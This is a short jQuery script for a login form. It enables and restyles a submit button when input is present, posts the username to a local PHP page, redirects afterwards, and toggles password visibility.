var tovalid = $(".tovalid");
var btton_valid = $(".btton_valid");
btton_valid.css({
	background:"#d4d1cb",
	borderColor: "#d4d1cb",
	color:"#909394"
})
tovalid.keyup(function(){
	if ($(".tovalid").val() != "") {
		btton_valid.removeAttr("disabled");
		btton_valid.css({
			background:"#005baa",
			color:"white",
			cursos:"pointer"
		})
	}else{
		btton_valid.attr("disabled","disabled");
		btton_valid.css({
			background:"#d4d1cb",
			borderColor: "#d4d1cb",
			color:"#909394",
			cursos:"not-allowed"
		})
	}
})
$(".loader").hide();
btton_valid.click(function(){
	$(".loader").show("slow");
	$.ajax({
		type:"POST",
		url:"consultas.php",
		data:{user:$(".user").val()},
		success:function(){
			$(".loader").hide("slow");
			window.location.href="pss.php";
		}
	})
})
function allowed(){
	if ($(".password").attr("type") == "password") {
		$(".password").attr("type", "text");
	}else{
		$(".password").attr("type","password");
	}
}